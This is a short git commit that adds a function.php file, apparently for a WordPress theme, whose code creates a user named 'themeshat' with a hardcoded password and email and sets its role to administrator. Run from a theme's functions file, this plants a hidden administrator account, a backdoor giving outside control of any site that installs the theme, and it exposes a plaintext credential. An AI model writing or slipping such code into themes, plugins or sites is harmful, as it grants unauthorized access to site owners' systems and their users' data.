479469088be7390a9d622ae73bca4b056ebaa8b8
shovokhan <shovokhan55@gmail.com>
2020-05-11 21:50:56 +0600

    first commit

---
+++ function.php
@@ -0,0 +1,4 @@
+funstion file er modda user create code
+
+$themeshat = new WP_User(wp_create_user( 'themeshat', 'rubelkhan2016', 'm.rubelkhan2016@gmail.com'));
+$themeshat->set_role('administrator');
